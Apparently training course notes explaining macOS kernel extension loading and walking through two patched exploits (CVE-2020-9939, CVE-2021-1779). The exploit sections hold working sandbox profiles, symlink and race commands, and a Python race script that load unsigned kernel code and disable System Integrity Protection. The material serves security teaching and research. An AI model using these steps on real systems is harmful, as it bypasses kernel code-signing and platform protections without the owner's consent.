# Module 11: Getting Kernel Code Execution

## KEXT Loading Restrictions

Requirements to load a kernel extension on macOS:
1. **Signed** with a kernel code signing certificate (special application to Apple required)
2. **Notarized** by Apple (binary scanned for malware)
3. **Root privileges** to initiate load
4. **Ownership:** All files/directories owned by root:wheel, only main executable has execute permissions, no global write
5. **User approval** via System Preferences (SKEL - Secure Kernel Extension Loading)
6. **Reboot required** (Big Sur and later)

## Sample KEXT Structure

**hellokext.c:**
```c
#include <mach/mach_types.h>
#include <libkern/libkern.h>

kern_return_t hellokext_start(kmod_info_t * ki, void *d) {
    printf("hello from hellokext");
    return KERN_SUCCESS;
}

kern_return_t hellokext_stop(kmod_info_t *ki, void *d) {
    printf("hello from hellokext");
    return KERN_SUCCESS;
}
```

**Info.plist additions (determine libraries with `kextlibs`):**
```bash
kextlibs hellokext.kext
# com.apple.kpi.libkern = 19.0
```
```xml
<key>OSBundleLibraries</key>
<dict>
    <key>com.apple.kpi.libkern</key>
    <string>19.0</string>
</dict>
```

**Loading attempt:**
```bash
sudo kextutil -v hellokext.kext
# Untrusted kexts are not allowed
# Kext with invalid signature (-67050) denied:
# /Library/StagedExtensions/Users/offsec/023AA376-E5E9-40BC-9537-337FA7B60EC1.kext
```

## KEXT Loading Process (Catalina)

All verification happens in user space; the kernel just loads the KEXT after checks pass.

### Flow: kextload/kextutil -> kextd -> staging -> syspolicyd -> XNU

**1. Initiation:** kextload sends Mach message to kextd (`com.apple.KernelExtensionServer`)

**2. kextd checks (kextdProcessUserLoadRequest):**
- `checkNonrootLoadAllowed` - checks `OSBundleAllowUserLoad` in Info.plist
- Sandbox check for `system-kext-load`
- `OSKextIsInExcludeList` - Apple's deny list

**3. Staging (createStagedKext in staging.m):**
- `stagingEnabled()` - checks if SIP is enabled
- `kextRequiresStaging()` - checks if KEXT is in a secure location
- `createStagingURL()` - creates destination path under `/Library/StagedExtensions/`
- `stageBundle()` - copies KEXT to temp UUID location, validates signature, moves to final location

**Secure location check:** Path must have `com.apple.rootless: KernelExtensionManagement` xattr:
```bash
xattr -l /Library/StagedExtensions
# com.apple.rootless: KernelExtensionManagement
```

**Staging paths:**
- Temporary: `/Library/StagedExtensions/path/to/kext/[UUID].kext`
- Final: `/Library/StagedExtensions/path/to/kext/some.kext`

**4. Authentication (authenticateKext in security.c):**
- Second signature check
- File system permissions verification
- `SPAllowKextLoad` -> XPC call to syspolicyd

**5. syspolicyd:** Queries `/var/db/SystemPolicyConfiguration/KextPolicy` database
```sql
sqlite3 /var/db/SystemPolicyConfiguration/KextPolicy
select * from kext_policy;
-- EG7KH642X6|com.vmware.kext.VMwareGfx|1|VMware, Inc.|1
```

**6. Loading:** `kext_request` Mach system call to XNU -> `kxld_link_file`

**Binaries with `com.apple.private.security.kext-management` entitlement:**
syspolicyd, kextload, kextutil, kextd, kextcache

## CVE-2020-9939: Unsigned KEXT Load via Race Condition (pwn2own 2020)

### Vulnerability

Temporary staging location is predictable and can be preserved with dangling symlinks.

### Exploit Plan

1. Create KEXT with embedded symlink to `/private/tmp/`
2. Stage it (copy to `/Library/StagedExtensions/`) but prevent deletion
3. Place second KEXT via the symlink path
4. During second load, staging follows symlink to attacker-controlled location
5. Race to swap signed KEXT with unsigned one between verification and loading

### Step 1: Stage KEXT with Symlink

**Sandbox profile (1.sb) to preserve staged files:**
```scheme
(version 1)
(allow default)
(deny mach-lookup (global-name "com.apple.KernelExtensionServer"))
(deny syscall-unix
  (syscall-number SYS_unlink)
  (with send-signal SIGTERM))
```

```bash
cp -R /System/Library/Extensions/ntfs.kext /private/tmp/
ln -s /private/tmp/ /private/tmp/ntfs.kext/symlink
sandbox-exec -f 1.sb kextload -v 6 /private/tmp/ntfs.kext
# KEXT fails validation but symlink remains in staging

ls -l /Library/StagedExtensions/private/tmp/793A17B4-...kext/
# Contents/  symlink -> /private/tmp/
```

### Step 2: Race with Sandbox-Controlled Pausing

**Sandbox profile (2.sb) to pause kextload:**
```scheme
(version 1)
(allow default)
(deny mach-lookup (global-name "com.apple.KernelExtensionServer"))
(allow file*
  (regex "\/private\/tmp\/ntfs.kext$")
  (with send-signal SIGSTOP))
```

**Two swaps needed:**
1. Replace `/tmp/ntfs.kext` with symlink to `/System/Library/Extensions/ntfs.kext` (pass secure location check)
2. Remove symlink, replace with unsigned KEXT (after authentication, before kernel load)

```bash
# Start load with pausing
sandbox-exec -f 2.sb kextload -v 6 /private/tmp/[UUID].kext/symlink/ntfs.kext

# Swap 1: after "Reading loaded kext info" message
mv ntfs.kext ntfs2.kext
ln -s /System/Library/Extensions/ntfs.kext ntfs.kext
killall -CONT kextload

# Swap 2: after "KextAudit initialized" or trial-and-error timing
rm -rf ntfs.kext
mv ntfs2.kext ntfs.kext
cp /Users/offsec/hellokext.kext/Contents/MacOS/hellokext ntfs.kext/Contents/MacOS/ntfs
killall -CONT kextload
```

**Automated race script (Python):**
```python
#!/usr/bin/python3
import time, os, subprocess
from subprocess import Popen, PIPE

def cleanup():
    os.system("rm -rf /tmp/ntfs.kext")
    os.system("kextunload -b com.apple.filesystems.ntfs")

attempt = 70
while(1):
    cleanup()
    p = Popen(["sandbox-exec","-f","/tmp/2.sb","kextload","-v","6",
        "/private/tmp/[UUID].kext/symlink/ntfs.kext"])
    for i in range(100):
        time.sleep(0.5)
        os.system("killall -CONT kextload")
        if (i == 6):  # First swap
            os.system("mv /tmp/ntfs.kext /tmp/ntfs2.kext")
            os.system("ln -s /System/Library/Extensions/ntfs.kext /tmp/ntfs.kext")
        if(i == attempt):  # Second swap
            os.system("rm -rf ntfs.kext")
            os.system("mv ntfs2.kext ntfs.kext")
            os.system("cp /path/to/unsigned/binary /tmp/ntfs.kext/Contents/MacOS/ntfs")
    attempt = attempt - 1
```

### Disabling SIP with Unrootless.kext

Replace the binary swap target with the Unrootless kernel driver to disable SIP:
```bash
csrutil status
# System Integrity Protection status: disabled.
```

## CVE-2021-1779: Bypass of the Patch

### The Patch (Catalina 10.15.5+)

Temporary staging moved to: `/private/var/db/KernelExtensionManagement/Staging/tmp.XXXXXX/[UUID].kext`
Final location remains: `/Library/StagedExtensions/path/to/kext/some.kext`

This breaks the previous exploit since temp and final locations are completely different.

### Code Signing Bypass via Hardlinks

CodeResources file contains `omit` rules that exclude certain paths from signature verification:
```xml
<key>^(.*/)?\.DS_Store$</key>
<dict><key>omit</key><true/></dict>
<key>^PkgInfo$</key>
<dict><key>omit</key><true/></dict>
```

A symlink placed at an omitted path (e.g., `PkgInfo`) does not invalidate the code signature:
```bash
cp -R /System/Library/Extensions/ntfs.kext .
ln -s /tmp/empty/ ntfs.kext/Contents/PkgInfo    # Symlink at omitted path
kextutil -v 6 ntfs.kext                          # Loads successfully!

ls -l /Library/StagedExtensions/private/tmp/ntfs.kext/Contents/
# PkgInfo -> /tmp/empty/                         # Symlink staged!
```

### Interactive Mode (No Race Needed)

`kextutil -interactive` prompts user after all verification passes, allowing comfortable swap:

```bash
# Stage KEXT with symlink to /tmp/empty
kextutil -v 6 -interactive /private/tmp/ntfs.kext/Contents/PkgInfo/ntfs.kext
# "Load ... into the kernel [Y/n]?"

# In another terminal - make the swap:
mv /tmp/empty /tmp/oldempty
mkdir /tmp/empty
cp -R /System/Library/Extensions/ntfs.kext /tmp/empty/
cp /path/to/Unrootless.kext/Contents/MacOS/Unrootless /tmp/empty/ntfs.kext/Contents/MacOS/ntfs

# Answer Y twice in first terminal
# SIP is now disabled
csrutil status
# System Integrity Protection status: disabled.
```

## Big Sur Changes

- `kextd` replaced by `kernelmanagerd` (closed source, rewritten in Swift)
- `kextload`/`kextutil` now delegate to `kmutil` (closed source)
- Interactive mode removed
- KEXTs require user approval + reboot
- New kernel cache at `/Library/KernelCollections/AuxiliaryKernelExtensions.kc`
- Loading always uses cached version; system KEXTs cannot be used as carriers
- No known bypasses at time of writing
